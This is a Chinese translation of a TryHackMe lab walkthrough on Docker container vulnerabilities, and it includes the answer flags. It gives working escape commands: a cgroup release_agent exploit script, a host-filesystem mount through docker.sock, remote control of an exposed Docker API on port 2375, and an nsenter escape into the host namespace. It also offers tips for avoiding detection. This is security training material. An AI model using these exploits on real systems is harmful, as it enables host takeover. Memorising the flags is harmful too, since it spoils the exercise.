---
sidebar_position: 4
---

# 容器漏洞

## 任务 1 简介（部署）

本房间将演示 Docker 容器中发现的一些常见漏洞，以及攻击者如何利用这些漏洞进行逃逸。

### 学习目标

在本房间中，您将学习以下内容：

- Docker 容器中可能存在的一些漏洞。
- 作为攻击者，您可以通过利用这些漏洞获得什么。
- 为什么这些漏洞会存在（即配置错误）。
- 如何在 Docker 容器中搜索漏洞。

### 先决条件

在继续之前，强烈建议您已完成 Docker 入门房间，并熟悉 Linux CLI。

### 重要背景

本房间重点利用 Docker 守护进程本身，这通常依赖于在容器内拥有提升的权限。 换句话说，本房间假设您已在容器中成功成为 root 用户。

### 部署本房间的易受攻击机器

按下此任务右上角的绿色“启动机器”按钮。 您可以通过 TryHackMe AttackBox 或将自己的机器连接到 TryHackMe 网络，使用以下凭据访问该机器。 您将使用此机器回答本房间各任务中的问题。

|  键  |                值                |
| :-: | :-----------------------------: |
| 用户名 |               root              |
|  密码 |          tryhackme123!          |
|  IP | MACHINE_IP |

:::info 回答以下问题

<details>

<summary> 完成我以继续本房间！ </summary>

```plaintext
No answer needed
```

</details>

:::

## 任务 2 容器漏洞 101

在开始之前，有必要回顾一下在[容器化入门](https://tryhackme.com/room/introtocontainerisation)房间中学到的一些内容。 首先，让我们回顾一下容器是隔离的，并且具有最小化的环境。 下图描绘了一个容器的环境。

![说明单个计算机上的三个容器](img/image_20251122-192221.png)

**需要注意的一些重要事项是：**

即使您有权访问（即立足点）容器，也不意味着您有权访问主机操作系统及相关文件或其他容器。

由于容器的最小化特性（即它们只有开发人员指定的工具），您不太可能找到基本工具，如 Netcat、Wget 甚至 Bash！ 这使得攻击者在容器内进行交互相当困难。

### 我们预期在 Docker 容器中找到哪些类型的漏洞

虽然 Docker 容器旨在将应用程序彼此隔离，但它们仍然可能易受攻击。 例如，应用程序的硬编码密码可能仍然存在。 如果攻击者能够通过易受攻击的 Web 应用程序获得访问权限，例如，他们将能够找到这些凭据。 您可以在下面的代码片段中看到一个包含数据库服务器硬编码凭据的 Web 应用程序示例：

```php
/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database name */
define( 'DB_NAME', 'sales' );

/** Database username */
define( 'DB_USER', 'production' );

/** Database password */
define( 'DB_PASSWORD', 'SuperstrongPassword321!' );
```

当然，这不是容器中唯一可被利用的漏洞。 其他潜在的攻击向量已在下表中列出。

| 漏洞      | 描述                                                                                                                              |
| :------ | :------------------------------------------------------------------------------------------------------------------------------ |
| 配置错误的容器 | 配置错误的容器将具有容器操作不需要的权限。 例如，以“特权”模式运行的容器将有权访问主机操作系统 - 移除了隔离层。                                                                      |
| 易受攻击的镜像 | 曾多次发生流行的 Docker 镜像被植入后门以执行恶意操作（如加密货币挖矿）的事件。                                                                                     |
| 网络连接    | 未正确联网的容器可能暴露在互联网上。 例如，Web 应用程序的数据库容器应仅对 Web 应用程序容器可访问 - 而不是互联网。<br />此外，容器可以成为横向移动的一种方法。 一旦攻击者有权访问一个容器，他们可能能够与主机上未暴露到网络的其他容器交互。 |

这只是容器中可能存在的一些漏洞类型的简要总结。 本房间的任务将深入探讨这些内容！

:::info 回答以下问题

<details>

<summary> 点击进入下一个任务！ </summary>

```plaintext
No answer needed
```

</details>

:::

## 任务 3 漏洞 1：特权容器（能力）

### 理解能力

从根本上说，Linux 能力是授予 Linux 内核内进程或可执行文件的 root 权限。 这些特权允许细粒度地分配权限 - 而不是一次性分配所有权限。

这些能力决定了 Docker 容器对操作系统具有哪些权限。 Docker 容器可以在两种模式下运行：

- 用户（普通）模式
- 特权模式

在下图中，我们可以看到两种不同模式的运行情况以及每种模式对主机的访问级别：

![说明不同容器模式和特权及其对操作系统的访问级别。](img/image_20251128-192822.png)

请注意容器 #1 和 #2 以“用户/普通”模式运行，而容器 #3 以“特权”模式运行。 “用户”模式下的容器通过 Docker 引擎与操作系统交互。 然而，特权容器不这样做。 相反，它们绕过 Docker 引擎，直接与操作系统通信。

### 这对我们意味着什么

嗯，如果容器以对操作系统的特权访问运行，我们实际上可以在主机上以 root 身份执行命令。

我们可以使用诸如 `capsh` 这样的实用程序（随 libcap2-bin 包提供）来列出我们容器的能力：`capsh --print`。 能力在 Linux 中用于向进程分配特定权限。 列出容器的能力是确定可进行的系统调用和潜在利用机制的好方法。

下面终端片段中提供了一些值得关注的能力。

```shell title="Listing capabilities of a privileged Docker Container"
cmnatic@privilegedcontainer:~$ capsh --print 
Current: = cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid,cap_setuid
```

在下面的漏洞利用示例中，我们将使用挂载系统调用（由容器的能力允许）将主机的控制组挂载到容器中。

下面的代码片段基于（但经过修改）[Trailofbits 创建的概念验证 (PoC)](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)，该 PoC 详细描述了此漏洞利用的内部工作原理。

---

```shell
1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
2. echo 1 > /tmp/cgrp/x/notify_on_release
3. host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
4. echo "$host_path/exploit" > /tmp/cgrp/release_agent
5. echo '#!/bin/sh' > /exploit
6. echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
7. chmod a+x /exploit
8. sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

注意：我们可以在 /exploit 文件（步骤 5）中放置任何我们喜欢的内容。 例如，这可能是到我们攻击机器的反向 shell。

---

### 漏洞解释

1. 我们需要创建一个组来使用 Linux 内核编写和执行我们的漏洞利用。 内核使用 "cgroups" 来管理操作系统上的进程。 由于我们可以作为主机上的 root 管理 "cgroups"，我们将其挂载到容器的 "/tmp/cgrp"。
2. 为了让我们的漏洞利用执行，我们需要告诉内核运行我们的代码。 通过将 "1" 添加到 "/tmp/cgrp/x/notify_on_release"，我们告诉内核在 "cgroup" 完成后执行某些内容。 ([Paul Menage., 2004](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt))。
3. 我们找出容器文件在主机上的存储位置并将其存储为变量。
4. 然后我们将容器文件的位置回显到我们的 "/exploit" 中，最终到 "release_agent"，这将在 "cgroup" 释放时被执行。
5. 让我们将我们的漏洞利用转换为主机上的 shell
6. 一旦 "/exploit" 被执行，执行命令将主机标志回显到容器中名为 "flag.txt" 的文件中。
7. 使我们的漏洞利用可执行！
8. 我们创建一个进程并将其存储到 "/tmp/cgrp/x/cgroup.procs" 中。 当进程被释放时，内容将被执行。

:::info 回答以下问题

<details>

<summary> 在此任务中对目标机器执行漏洞利用。 **现在已添加到容器中的标志值是什么？** </summary>

```plaintext
THM{MOUNT_MADNESS}
```

</details>

:::

## 任务 4 漏洞 2：通过暴露的 Docker 守护进程逃逸

### Unix 套接字 101（通用）

当提到 "套接字" 时，您可能会想到网络中的 "套接字"。 嗯，这里的概念几乎相同。 套接字用于在两个位置之间移动数据。 Unix 套接字使用文件系统传输数据，而不是网络接口。 这被称为进程间通信（IPC），在操作系统中至关重要，因为能够在进程之间发送数据非常重要。

Unix 套接字在传输数据方面比 TCP/IP 套接字快得多 ([Percona., 2020](https://www.percona.com/blog/2020/04/13/need-to-connect-to-a-local-mysql-server-use-unix-domain-socket/))。 这就是为什么像 [Redis](https://redis.io/) 这样的数据库技术能够提供如此出色的性能。 Unix 套接字也使用文件系统权限。 这一点在下一节中要记住。

### Docker 如何使用套接字

当与 Docker 引擎交互时（即运行诸如 `docker run` 之类的命令），这将使用套接字完成（通常，这是使用 Unix 套接字完成的，除非您向远程 Docker 主机执行命令）。 回想一下，Unix 套接字使用文件系统权限。 这就是为什么您必须是 Docker 组的成员（或者是 root！） 才能运行 Docker 命令，因为您需要权限来访问 Docker 拥有的套接字。

```shell title="Verifying that our user is a part of the Docker group"
cmnatic@demo-container:~$ groups
cmnatic sudo docker
```

### 在容器中查找 Docker 套接字

请记住，容器使用 Docker 引擎与主机操作系统交互（因此，可以访问 Docker 套接字！） 这个套接字（名为 docker.sock）将被挂载到容器中。 此位置因容器运行的操作系统而异，因此您需要 `find` 它。 但是，在此示例中，容器运行 Ubuntu 18.04，意味着 docker.sock 位于 `/var/run` 中。

**注意**：此位置可能因操作系统而异，甚至可以在容器运行时由开发人员手动设置。

```shell title="Finding the docker.sock file in a container"
cmnatic@demo-container:~$ ls -la /var/run | grep sock
srw-rw---- 1 root docker 0 Dec 9 19:37 docker.sock
```

### 利用容器中的 Docker 套接字

首先，让我们确认我们可以执行 docker 命令。 您需要在容器上是 root 用户，或者作为低权限用户拥有 "docker" 组权限。

让我们分解这里的漏洞：

---

我们将使用 Docker 创建一个新容器，并将主机的文件系统挂载到这个新容器中。 然后我们将访问新容器并查看主机的文件系统。

我们的最终命令将如下所示：`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`，它执行以下操作：

1. 我们将需要上传一个 docker 镜像。 对于这个房间，我已经在 VM 上提供了这个。 它被称为 "alpine"。 "alpine" 发行版不是必需的，但它非常轻量级，并且会更好地融入环境。 为了避免检测，最好使用系统中已存在的镜像，否则，您必须自己上传。
2. 我们将使用 `docker run` 启动新容器并将主机的文件系统 (/) 挂载到新容器中的 (/mnt)：`docker run -v /:/mnt`
3. 我们将告诉容器以交互方式运行（以便我们可以在新容器中执行命令）：`-it`
4. 现在，我们将使用已提供的 alpine 镜像：`alpine`
5. 我们将使用 `chroot` 将容器的根目录更改为 /mnt（我们在这里挂载来自主机操作系统的文件）：`chroot /mnt`
6. 现在，我们将告诉容器运行 `sh` 以获得 shell 并在容器中执行命令：`sh`

您可能需要 "Ctrl + C" 一次或两次来取消漏洞利用，但如下所示，我们已成功将主机操作系统的文件系统挂载到新的 alpine 容器中。

---

### 验证成功

执行命令后，我们应该看到我们已被放置到一个新容器中。 请记住，我们将主机的文件系统挂载到 /mnt（然后使用 `chroot` 使容器的 /mnt 变为 /）

所以，让我们通过 `ls /` 查看 / 的内容

```shell title="Listing the contents of / on the new container (which will have the host operating system's files)"
root@alpine-container:~# ls /
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swapfile  tmp  var
```

:::info 回答以下问题

<details>

<summary> 命名容器上包含 docker.sock 文件的目录路径。 </summary>

```plaintext
/var/run
```

</details>

<details>

<summary> 在此任务中对目标机器执行漏洞利用。 **主机操作系统上 /root/flag.txt 处的标志值是什么？** </summary>

```plaintext
THM{NEVER-ENOUGH-SOCKS}
```

</details>

:::

## 任务 5 漏洞 3：通过暴露的 Docker 守护进程进行远程代码执行

### Docker 引擎 - TCP 套接字版

回想一下 Docker 在先前任务中如何使用套接字在主机操作系统和容器之间通信。 Docker 也可以使用 TCP 套接字来实现这一点。

Docker 可以远程管理。 例如，使用管理工具如 [Portainer](https://www.portainer.io/) 或 [Jenkins](https://www.jenkins.io/) 来部署容器以测试其代码（耶，自动化！）。

### 漏洞

当配置为远程运行时，Docker 引擎将监听一个端口。 Docker 引擎易于远程访问，但难以安全地实现。 这里的漏洞是 Docker 可远程访问并允许任何人执行命令。 首先，我们需要枚举。

### 枚举：查找设备是否具有可远程访问的 Docker

默认情况下，引擎将在 **端口 2375** 上运行。 我们可以通过从您的 AttackBox 对目标 (10.80.133.1) 执行 Nmap 扫描来确认这一点。

```shell title="Verifying if our target has Docker remotely accessible"
cmnatic@attack-machine:~$ nmap -sV -p 2375 10.80.133.1 Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-02 21:27 GMT
Nmap scan report for docker-host (10.80.133.1)
Host is up (0.0018s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE VERSION
2375/tcp open docker Docker 20.10.20 (API 1.41)
```

看起来它是开放的；我们将使用 `curl` 命令开始与暴露的 Docker 守护进程交互。 确认我们可以访问 Docker 守护进程：curl `http://MACHINE_IP:2375/version`

```shell title="CURLing the Docker Socket"
cmnatic@attack-machine:~$ curl http://10.80.133.1:2375/version
{
  "Platform": {
    "Name": "Docker Engine - Community"
  },
  "Components": [
    {
      "Name": "Engine",
      "Version": "20.10.20",
      "Details": {
        "ApiVersion": "1.41",
        "Arch": "amd64",
        "BuildTime": "2022-10-18T18:18:12.000000000+00:00",
        "Experimental": "false",
        "GitCommit": "03df974",
        "GoVersion": "go1.18.7",
        "KernelVersion": "5.15.0-1022-aws",
        "MinAPIVersion": "1.12",
        "Os": "linux"
      }]
}
```

### 在我们的目标上执行 Docker 命令

为此，我们需要告诉我们的 Docker 版本将命令发送到我们的目标（而不是我们自己的机器）。 我们可以添加 "-H" 开关到我们的目标。 要测试我们是否可以运行命令，我们将列出目标上的容器：`docker -H tcp://10.80.133.1:2375 ps`

```shell title="Listing the containers on our target"
cmnatic@attack-machine:~$ docker -H tcp://10.80.133.1:2375 ps
CONTAINER ID   IMAGE        COMMAND               CREATED        STATUS         PORTS                               NAMES
b4ec8c45414c   dockertest   "/usr/sbin/sshd -D"   10 hours ago   Up 7 minutes   0.0.0.0:22->22/tcp, :::22->22/tcp   priceless_mirzakhani
```

### 现在怎么办

既然我们已经确认可以在目标上执行 docker 命令，我们就可以做各种各样的事情。 例如，启动容器、停止容器、删除它们，或者导出容器的内容供我们进一步分析。 值得回顾一下 [Intro to Docker](https://tryhackme.com/room/introtodockerk8pdqk) 中涵盖的命令。 但是，我包含了一些您可能希望探索的命令：

| 命令     | 描述                          |
| :----- | :-------------------------- |
| images | 列出容器使用的镜像；数据也可以通过逆向工程镜像来外泄。 |
| exec   | 在容器上执行命令。                   |
| run    | 运行一个容器。                     |

:::info 回答以下问题

<details>

<summary> Docker 引擎默认使用哪个端口号？ </summary>

```plaintext
2375
```

</details>

:::

## 任务 6 漏洞 4：滥用命名空间

### 什么是命名空间

命名空间将系统资源（如进程、文件和内存）与其他命名空间隔离开来。 在 Linux 上运行的每个进程都将被分配两样东西：

- 一个命名空间
- 一个进程标识符 (PID)

命名空间是实现容器化的方式！ 进程只能"看到"同一命名空间中的进程。 以 Docker 为例，每个新容器都将作为一个新的命名空间运行，尽管容器可能运行多个应用程序（进程）。
让我们通过比较主机操作系统上的进程数量与主机正在运行的 Docker 容器（一个 apache2 Web 服务器）来证明容器化的概念：

```shell title="Listing running processes on a "normal" Ubuntu system"
cmnatic@thm-dev:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
--cut for brevity--
cmnatic     1984  0.0  0.7 493400 28932 ?        Sl   00:48   0:00 update-notifier
cmnatic     2263  5.6 10.0 3385096 396960 ?      Sl   00:48   0:08 /snap/firefox/1232/usr/lib/firefox/firefox
cmnatic     2429  0.4  2.8 2447088 114900 ?      Sl   00:48   0:00 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 1 -isForBrowser -prefsLen 1 -
cmnatic     2457  0.0  0.4 1385228 18496 ?       Sl   00:48   0:00 /usr/bin/snap userd
cmnatic     3054  0.1  2.3 2425836 91936 ?       Sl   00:48   0:00 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 2 -isForBrowser -prefsLen 520
cmnatic     3346  1.7  4.1 2526924 162944 ?      Sl   00:48   0:02 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 3 -isForBrowser -prefsLen 584
cmnatic     3350  0.0  1.6 2390708 66560 ?       Sl   00:48   0:00 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 4 -isForBrowser -prefsLen 584
cmnatic     3369  0.0  1.6 2390712 66672 ?       Sl   00:48   0:00 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 5 -isForBrowser -prefsLen 584
cmnatic     3417  0.0  1.6 2390708 66432 ?       Sl   00:48   0:00 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 6 -isForBrowser -prefsLen 590
cmnatic     3490  0.0  0.3 428192 12288 ?        Sl   00:49   0:00 /usr/libexec/deja-dup/deja-dup-monitor
cmnatic     3524  0.4  1.8 932320 74496 ?        Sl   00:49   0:00 /usr/bin/nautilus --gapplication-service
cmnatic     3545  0.7  1.3 557340 55232 ?        Ssl  00:49   0:00 /usr/libexec/gnome-terminal-server
cmnatic     3563  0.0  0.1  12908  6784 pts/0    Ss+  00:49   0:00 bash
--cut for brevity--
```

在最左边的第一列中，我们可以看到进程运行的用户，包括进程号 (PID)。 此外，请注意最右边的列包含启动进程的命令或应用程序（例如 Firefox 和 Gnome 终端）。 这里需要注意的是，有多个应用程序和进程正在运行（具体来说是 320 个！）。

一般来说，Docker 容器运行的进程非常少。 这是因为容器被设计为执行一项任务。 也就是说，只运行一个 Web 服务器或一个数据库。

### 确定我们是否在容器中（进程）

让我们使用 `ps aux` 列出 Docker 容器中运行的进程。 需要注意的是，在这个例子中我们只有六个进程在运行。 进程数量的差异通常是一个很好的指标，表明我们在容器中。

此外，下面代码片段中的第一个进程的 PID 为 1。 这是正在运行的第一个进程。 PID 1（通常是 init）是所有未来启动进程的祖先（父进程）。 如果由于某种原因这个进程停止，那么所有其他进程也会停止。

```shell title="Listing running processes on a container"
root@demo-container:~# ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.2 166612 11356 ?        Ss   00:47   0:00 /sbin/init 
root          14  0.1 0.1 6520 5212 ?  S 00:47 0:00 /usr/sbin/apache2 -D FOREGROUND 
www-data      15  0.1 0.1 1211168 4112 ?  S 00:47 0:00 /usr/sbin/apache2 -D FOREGROUND 
www-data      16  0.1 0.1 1211168 4116 ?  S 00:47 0:00 /usr/sbin/apache2 -D FOREGROUND
root          81  0.0 0.0 5888 2972 pts/0  R+ 00:52 ps aux
```

相比之下，我们可以看到只有 5 个进程在运行。 一个很好的指标，表明我们在容器中！ 然而，我们很快就会发现，这并非 100% 确定。 在某些情况下，讽刺的是，您希望容器能够直接与主机交互。

### 我们如何滥用命名空间

回顾之前漏洞中的 cgroups（控制组）。 我们将在另一种利用方法中使用这些。 这种攻击滥用了容器与主机操作系统共享相同命名空间的情况（因此，容器可以与主机上的进程通信）。

您可能会在容器依赖正在运行的进程或需要"插入"主机的情况下看到这种情况，例如使用调试工具时。 在这些情况下，当通过 `ps aux` 列出进程时，您可以在容器中看到主机的进程。

```shell title="Edge case: Determining if a container can interact with the host's processes"
root@demo-container:~# ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.1  0.5 102796 11372 ?        Ss   11:40   0:03 /sbin/init
root           2  0.0  0.0      0     0 ?        S    11:40   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   11:40   0:00 [rcu_gp]
-- cut for brevity --
root        2119  0.0  0.1 1148348 3372 ?        Sl   12:00   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 22 -container-ip 172.17.0.2 -container
root        2125  0.0  0.1 1148348 3392 ?        Sl   12:00   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 22 -container-ip 172.17.0.2 -container-port
root        2141  0.0  0.4 712144  9192 ?        Sl   12:00   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 2032326e64254786be0a420199ef845d8f97afccba9e2e
root        2163  0.0  0.2  72308  5644 ?        Ss   12:00   0:00 /usr/sbin/sshd -D
```

### 漏洞

对于此漏洞，我们将使用 nsenter（命名空间进入）。 此命令允许我们执行或启动进程，并将它们放置在另一个进程的同一命名空间中。 在这种情况下，我们将滥用容器可以看到主机上的 "/sbin/init" 进程这一事实，这意味着我们可以在主机上启动新命令，例如 bash shell。

---

使用以下利用：`nsenter --target 1 --mount --uts --ipc --net /bin/bash`，其作用如下：

1. 我们使用值为 "1" 的 `--target` 开关来执行我们稍后提供的 shell 命令，在特殊系统进程 ID 的命名空间中执行以获得终极 root 权限！

2. 指定 `--mount`，这是我们提供目标进程的挂载命名空间的地方。 "如果未指定文件，则进入目标进程的挂载命名空间。" ([Man.org., 2013](https://man7.org/linux/man-pages/man1/nsenter.1.html))。

3. `--uts` 开关允许我们与目标进程共享相同的 UTS 命名空间，意味着使用相同的主机名。 这很重要，因为主机名不匹配可能导致连接问题（尤其是网络服务）。

4. `--ipc` 开关意味着我们进入进程的进程间通信命名空间，这很重要。 这意味着可以共享内存。

5. `--net` 开关意味着我们进入网络命名空间，意味着我们可以与系统的网络相关功能交互。 例如，网络接口。 我们可以使用这个来打开一个新的连接（例如在主机上的稳定反向 shell）。

6. 由于我们目标是 "**/sbin/init**" 进程 #1（尽管它是 "**lib/systemd/systemd**" 的符号链接以保持向后兼容性），我们正在使用 [systemd](https://www.freedesktop.org/wiki/Software/systemd/) 守护进程的命名空间和权限来运行我们的新进程（shell）

7. 这是我们的进程将被执行到这个特权命名空间的地方：`sh` 或一个 shell。 这将在内核的同一命名空间（因此也是权限）中执行。

您可能需要按 "**Ctrl + C**" 一次或两次来取消此漏洞的利用，但如下所示，我们已经逃逸了 docker 容器，并且可以查看主机操作系统（显示主机名的变化）

---

```shell title="Using the command line of the container to run commands on the host"
root@demo-container:~# hostname
thm-docker-host
```

成功！ 我们现在将能够在命名空间中作为 root 查看主机操作系统，这意味着我们拥有对主机上任何内容的完全访问权限！

:::info 回答以下问题

<details>

<summary> 在目标机器上执行此任务中的利用。 **位于 /home/tryhackme/flag.txt 的标志是什么？** </summary>

```plaintext
THM{YOUR-SPACE-MY-SPACE}
```

</details>

:::

## 任务 7 结论

呼...这很有趣！ 在今天的房间中，您了解了 Docker 容器可能存在的一些错误配置，如何发现这些配置，并最终利用它们。

现在，您可能想知道为什么容器可能以有效绕过 Docker 引入的安全机制的权限运行。 嗯，虽然这不是推荐的做法，但在某些用例中容器确实需要这种级别的交互。 例如，在 Docker 中运行 Docker，或者需要与主机的 iptables 或可能连接的设备交互的特定应用程序，如防火墙。

最终，在尝试确定分配给容器的权限时，也存在“采取快速/简单途径”的因素。 Docker（尤其是在最近）在加固方面做得很好。 例如，您可以在允许列表的基础上为容器授予特定能力。  然而，人们为了在不意识到更广泛后果的情况下使某些东西工作而给予超过必要的能力，这并非太牵强。

我们将在下一个**房间**“容器加固”中讨论如何防止这些错误配置和漏洞。

:::info 回答以下问题

<details>

<summary> 点击我完成房间！ </summary>

```plaintext
No answer needed
```

</details>

:::
